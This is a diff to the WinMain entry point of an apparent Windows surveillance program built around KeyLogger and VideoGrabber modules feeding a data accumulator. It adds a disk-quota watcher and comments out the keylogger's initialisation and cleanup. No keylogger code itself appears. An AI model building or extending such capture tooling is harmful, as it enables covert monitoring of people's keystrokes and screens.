@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include "DataAccumulator.h"
+#include "DiskQuotaWatcher.h"
 #include "DataProvider.h"
 #include "VideoGrabber.h"
 #include "KeyLogger.h"
@@ -8,13 +9,14 @@ int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
 					LPSTR lpCmdLine, int nCmdShow )
 {
 	DataAccumulator* dataAccumulator = new DataAccumulator();
+	DiskQuotaWatcher* quotaKeeper = new DiskQuotaWatcher(DataProvider::DATA_DIR, DiskQuotaWatcher::DEFAULT_QUOTA);
 	//VideoGrabber* videoGrabber = new VideoGrabber();
-	KeyLogger* keyLogger = new KeyLogger();
+	//KeyLogger* keyLogger = new KeyLogger();
 
 	//videoGrabber->SetDataAccumulator(dataAccumulator);
 	//videoGrabber->Init();
-	keyLogger->SetDataAccumulator(dataAccumulator);
-	keyLogger->Init();
+	//keyLogger->SetDataAccumulator(dataAccumulator);
+	//keyLogger->Init();
 
 	MSG Msg; // save window messages here.
 
@@ -24,10 +26,11 @@ int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
         DispatchMessage(&Msg); // Send message to WindowProcedure
     }
 
-	keyLogger->Finalize();
+	//keyLogger->Finalize();
 
 	//delete videoGrabber;
-	delete keyLogger;
-
+	//delete keyLogger;
+	delete quotaKeeper;
+	delete dataAccumulator;
 	return Msg.wParam;
 }
